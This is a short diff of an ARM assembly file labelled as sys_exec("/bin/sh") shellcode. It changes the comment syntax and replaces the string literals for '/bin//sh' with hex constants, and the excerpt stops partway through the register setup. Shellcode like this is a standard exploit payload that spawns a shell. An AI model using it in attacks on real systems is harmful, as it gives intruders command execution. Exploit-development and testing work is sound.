@@ -1,11 +1,11 @@
-#
-# ARM sys_exec("/bin/sh") shellcode
-#
-# @_hugsy_
-#
-ldr r0, ="nib/"
+;;;
+;;; ARM sys_exec("/bin/sh") shellcode
+;;;
+;;; @_hugsy_
+;;;
+ldr r0, =0x2f62696e
 str r0, [sp]
-ldr r0, ="hs//"
+ldr r0, =0x2f2f7368
 str r0, [sp, 4]
 mov r0, sp
 mov r1, 0
